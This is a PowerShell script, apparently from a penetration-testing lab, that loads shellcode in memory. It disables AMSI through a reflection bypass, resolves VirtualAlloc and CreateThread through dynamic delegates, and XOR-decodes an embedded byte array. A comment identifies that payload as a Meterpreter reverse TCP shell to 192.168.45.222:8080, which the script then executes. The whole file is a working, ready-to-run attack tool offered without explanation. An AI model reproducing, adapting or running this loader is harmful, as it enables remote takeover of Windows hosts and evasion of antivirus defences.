[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)

function Looker {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function Delegatore {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

function xorrer($bytes, $string) {
    $newBytes = @();
    for ($i = 0; $i -lt $bytes.Count; $i++) {
        $newBytes += $bytes[$i] -bxor $string[$i % $string.Length];
    } 
    return $newBytes;
  }
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.222 LPORT=8080 EXITFUNC=thread -f powershell --encrypt xor --encrypt-key 'xor_key'
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Looker kernel32.dll VirtualAlloc), 
  (Delegatore @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
  $webClient = [System.Net.WebClient]::new()
  [Byte[]] $buf = 0x88,0x80,0xe6,0x73,0x5f,0x69,0x13,0xd6,0x84,0x6e,0xb6,0xb,0xec,0xd,0x5b,0xee,0x2b,0x3d,0xaa,0x26,0x7c,0x58,0x8c,0xd4,0x1b,0x5b,0x50,0xd6,0x15,0x42,0x5e,0xa7,0xf3,0x57,0x4,0x5,0x33,0xd,0x54,0xa9,0xa6,0x7e,0x5e,0xae,0x3a,0x2a,0x8e,0xd,0x33,0xe4,0x35,0x4f,0xe0,0x27,0x45,0x30,0xf1,0xff,0x28,0x11,0xf6,0x9f,0x1d,0x3f,0x5e,0xb1,0xf,0xef,0x37,0x47,0x5e,0xb8,0xee,0x31,0x29,0xa4,0xbd,0x1c,0x55,0x42,0xa0,0x20,0xf8,0x6b,0xea,0x5e,0xb2,0x5e,0xa7,0xf3,0xaa,0xaa,0x74,0x30,0xe6,0x4c,0x88,0x1c,0x87,0x5c,0x14,0x8b,0x64,0x1c,0x7b,0x11,0x8f,0x3f,0xd4,0x33,0x41,0x78,0xe2,0x47,0xff,0x64,0x22,0xf8,0x7,0x75,0x72,0x8c,0xea,0x5b,0xef,0x6e,0xb7,0xd6,0x2f,0x41,0x5d,0x6a,0x7a,0x15,0x31,0x33,0x22,0xa0,0x89,0x2b,0x0,0x3b,0xd4,0x76,0x86,0xe7,0xa0,0x94,0x9a,0x24,0x59,0x12,0x46,0x68,0x69,0x1b,0x28,0x1a,0x41,0x0,0x35,0x37,0x28,0x18,0x41,0x58,0xe2,0x8d,0x86,0xe1,0x99,0xe4,0x69,0x69,0x73,0x76,0xad,0x27,0xf,0x9,0x76,0xe4,0x4,0x67,0xa0,0xbe,0xf,0x73,0x59,0xe1,0xdc,0x45,0xb7,0x1b,0x5d,0x69,0x6c,0xcf,0xe8,0xb9,0x34,0x3f,0x37,0xf,0x2b,0x35,0x39,0x61,0x49,0x9e,0x67,0xb6,0x93,0xa0,0xbc,0xe4,0x35,0x71,0x9,0x33,0x7,0xfe,0xfa,0x1f,0x4,0x86,0xe4,0xa4,0xb4,0x1c,0x63,0x8c,0x11,0x61,0x6,0xb3,0x89,0x38,0x64,0x6f,0x67,0x35,0x6b,0xf,0x7d,0x67,0x76,0x1c,0x6a,0xb0,0xbb,0x0,0x96,0xa6,0xdc,0x99,0x5f,0x1a,0x59,0xec,0x69,0x1,0x25,0x11,0x31,0x31,0x74,0x68,0x3f,0x19,0x5f,0x1,0x2b,0xfb,0x32,0xba,0x9b,0xba,0xf4,0xc,0x1,0x65,0x2f,0x62,0x76,0x1c,0x6a,0xb0,0xbb,0x0,0x96,0xa6,0xdc,0x99,0x5f,0x19,0x47,0x3f,0x37,0x6b,0x25,0x79,0x31,0x4b,0x74,0x38,0x1,0x78,0x70,0x66,0x43,0xa0,0xb4,0x8,0xc,0x1a,0x9,0x12,0xa,0x9a,0xac,0x6f,0x7f,0x8b,0x64,0x4d,0x7c,0xda,0x19,0x8c,0xa0,0x9e,0xb6,0xff,0x90,0x98,0xa0,0x6a,0xa6,0x50,0xf7,0x54,0xb5,0xab,0xd2,0x93,0x42,0x43,0x79,0x37,0xc7,0xca,0xd9,0xf2,0x98,0x8a,0x57,0x63,0x5,0x3b,0xa1,0x8f,0x88,0x1c,0x76,0xe4,0x2e,0x60,0x2d,0xe,0x35,0x64,0x3c,0x98,0x8a
  Write-Output 'Received'
  $key = "xor_key!";
  $buf = xorrer ($buf) $key;
  Write-Output 'dexored'
  [System.Runtime.InteropServices.Marshal]::Copy([Byte[]]$buf, 0, $lpMem, $buf.Length)
  Write-Output 'Marshal copied'
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Looker kernel32.dll CreateThread),
  (Delegatore @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Looker kernel32.dll WaitForSingleObject),
  (Delegatore @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
  Write-Output 'over'